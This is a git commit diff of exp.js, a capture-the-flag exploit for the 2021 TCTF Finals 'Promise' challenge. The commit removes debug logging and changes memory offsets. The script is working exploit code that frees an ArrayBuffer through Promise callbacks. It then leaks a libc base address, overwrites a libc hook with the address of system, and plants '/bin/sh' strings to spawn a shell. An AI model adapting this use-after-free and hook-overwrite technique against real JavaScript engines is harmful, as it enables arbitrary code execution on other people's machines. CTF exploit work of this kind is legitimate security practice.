3276e2538f05aab4fc8435fe8f52a6184c56ad0e
callmecro <81272184+callmecro@users.noreply.github.com>
2021-10-07 16:43:55 +0800

    Update exp.js

--- 2021/TCTF_Finals/Promise/exp.js
+++ 2021/TCTF_Finals/Promise/exp.js
@@ -2,42 +2,33 @@ const hex = (x) => {return ("0x" + x.toString(16))};
 let a0, a1;
 
 function f2() {
-	console.log('Resolve Two');
 	const abs = [];
-	a0 = undefined;
+	a0 = 1;
 	for (let i = 0; i < 8; i++) abs.push(new ArrayBuffer(8));; 
 	
 	const tas = [];
 	for (let i = 0; i < 8; i++)
 	{
 	  const ta = new Uint32Array(abs[i]);
-	  ta[0] = 1852400175;
-	  ta[1] = 6845231; 
+	  ta[0] = 0x6e69622f;
+	  ta[1] = 0x68732f; 
 	  tas.push(ta);
 	}
 
-	const libc_addr = a1[0xa0/4]+(a1[0xa0/4+1] * 0x100000000) - 0x3ec1e0
-	console.log(hex(libc_addr));
+	const libc_addr = a1[0xa0/4]+(a1[0xa0/4+1] * 0x100000000) - 0x3ebca0
 	
-	a1[0x458/4] = (libc_addr + 0x3ed8e8) & 0xffffffff;
-	a1[0x458/4+1] = ((libc_addr + 0x3ed8e8) - a1[0x1d8/4]) / 0x100000000;	
+	a1[0x578/4] = (libc_addr + 0x3ed8e8) & 0xffffffff;
+	a1[0x578/4+1] = ((libc_addr + 0x3ed8e8) - a1[0x578/4]) / 0x100000000;
 	tas[3][0] = (libc_addr + 0x4f550) & 0xffffffff;
 	tas[3][1] = ((libc_addr + 0x4f550) - tas[3][0]) / 0x100000000;
-	console.log('Finished!')
-
 }
 
 function f1(a) {
-	console.log('Resolve One');
-
-	arr = undefined; 
-
+	arr = 1; 
 	a0 = new Uint32Array(a);
-
 	a1 = a0; 
 
 	let p = new Promise((resolve, reject) => {
-		console.log('Resolve Two Init');
 		resolve(0);
 	});
 	p.then(f2);
@@ -46,11 +37,9 @@ function f1(a) {
 let arr = new ArrayBuffer(0xa00);
 function main() {
 	let p = new Promise((resolve, reject) => {
-		console.log('Promise Init');
 		resolve(arr);
 	});
 	p.then(f1);
-	console.log('Main Finished');
 }
 
 main();
